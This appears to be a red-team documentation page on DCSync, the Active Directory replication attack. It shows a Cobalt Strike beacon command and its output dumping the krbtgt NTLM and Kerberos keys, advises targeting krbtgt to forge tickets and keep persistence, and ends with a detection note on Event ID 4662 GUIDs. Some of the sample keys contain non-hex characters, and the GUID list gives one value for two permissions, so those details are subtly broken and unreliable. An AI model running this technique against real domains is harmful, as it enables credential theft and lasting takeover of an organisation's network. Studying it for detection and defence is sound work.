---
title: "Directory Replication Services Exploitation (DCSync)"
date: 2026-09-25
weight: 1
type: docs
tags:
  - Active Directory
  - Domain Dominance
---

Domain Controllers within an Active Directory forest continuously sync database updates to preserve consistency across geographical constraints. When a management action modifies an object, the local directory store logs the change and safely propagates the update to surviving replication partners via the Directory Replication Service Remote Protocol (MS-DRSR). 

Operators can take advantage of this architecture to request targeted credential syncs directly from a live Domain Controller without executing invasive code on the asset itself.

## Extracting Credential Data via DRS-R

DCSync is a highly effective credential extraction technique [[T1003.006](https://mitre.org)] that mimics the transaction flow of a standard domain controller update. By issuing specific RPC replication calls over the MS-DRSR protocol, an operator can request individual account secrets, password hashes, and history data blocks. Executing this technique requires specific high-tier directory access, such as Domain Administrator or Enterprise Administrator privileges, or a compromised Domain Controller computer account context.

This functionality is exposed natively through the `lsadump::dcsync` command block in Mimikatz. Cobalt Strike wraps this capability into the concise `dcsync` alias. While an operator can pull the entire NTDS database, standard operational practice favors targeting the critical `krbtgt` service profile. Because the private key material linked to this profile signs and encrypts every Ticket Granting Ticket (TGT) across the authentication zone, capturing its hash permits operators to forge custom, valid TGTs for any administrative identity.

```powershell
beacon> dcsync arcadia.local ARCADIA\krbtgt

[DC] 'arcadia.local' will be the domain
[DC] 'dc-1.arcadia.local' will be the DC server
[DC] 'ARCADIA\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 24/01/2025 13:50:53
Object Security ID   : S-1-5-21-4192837465-1122334455-998877665-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: b18fa4c320d54890a3eb65406f5a5971
    ntlm- 0: b18fa4c320d54890a3eb65406f5a5971
    lm  - 0: 5555c48c4b440676cfda7be586409941

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 2b8b1df83c2cdbeadba591130490e21e

* Primary:Kerberos-Newer-Keys *
    Default Salt : ARCADIA.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 623031123772358d785895ffa7f2c4cb63f75f39f68df3c4f78357f31e7d833d
      aes128_hmac       (4096) : a1f284d2gfeedeebfeea18f706c86dgb
      des_cbc_md5       (4096) : 3g3b9g458geg95g2
```

Active Directory does not cycle the `krbtgt` master secret automatically, requiring a manual, two-stage administrative administrative reset procedure to safely update. This operational overhead makes old or static `krbtgt` keys an exceptionally stable option for maintaining prolonged, high-privileged persistence within an environment.

## Operational Security (OPSEC)

Because MS-DRSR is an essential protocol for regular infrastructure maintenance, the generation of replication traffic is not inherently malicious. Defensive detection strategies look for unexpected replication traffic patterns, specifically auditing replication queries that originate from endpoint subnets or unapproved IP assets outside the designated Domain Controller organizational unit.

When Directory Service Access logging is actively configured, the directory engine records these synchronization requests under Windows Security Event ID **4662** (An operation was performed on an object). Monitoring engines isolate these attempts by filtering for specific Right GUID values:

* **`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`**: Maps to the **DS-Replication-Get-Changes** and **DS-Replication-Get-Changes-All** permissions, which are required to request secret attributes.
* **`89e95b76-444d-4c62-991a-0facbeda640c`**: Maps to **DS-Replication-Get-Changes-In-Filtered-Set**, indicating a replication call targeting filtered data attributes.
